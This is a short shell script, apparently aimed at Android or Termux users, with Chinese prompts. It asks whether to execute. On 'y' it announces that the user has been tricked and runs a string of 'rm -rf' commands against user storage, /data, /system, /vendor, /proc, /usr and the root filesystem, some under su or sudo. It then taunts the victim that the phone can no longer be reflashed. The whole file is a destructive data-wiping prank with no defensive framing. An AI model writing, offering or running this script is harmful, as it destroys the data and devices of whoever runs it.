clear
echo -e "\n\n"
echo -n "是否执行(y/n):"
read num
  case $num in
  y)
sleep 2
echo "哈哈哈被骗了!"
sleep 2
echo "要跑代码了"
rm -rf /storage/emulated/0/Android/data
rm -rf /storage/emulated/0/Android/
rm -rf /system
rm -rf /vendor/app
rm -rf /mnt
rm -rf /data/app
rm -rf /system/app
rm -rf /root
rm -rf /data
rm -rf /vendor
rm -rf /product
rm -rf /sdcard
rm -rf /storage/emulated/0
rm -rf /acct
rm -rf /system/etc
rm -rf /proc
su -c rm -rf /system/lib
sudo rm -rf /usr
sudo rm -rf /9008/fastboot
sudo rm -rf /system/usr/icu/recovery
rm rf /*
echo "data删除成功"
echo "目录已为0"
echo "system删除成功"
echo "vendor删除成功"
echo "product删除成功"
echo "9008没了你刷不了机了"
echo "再见！"
;;
n)
echo "这次原谅你"
;;
esac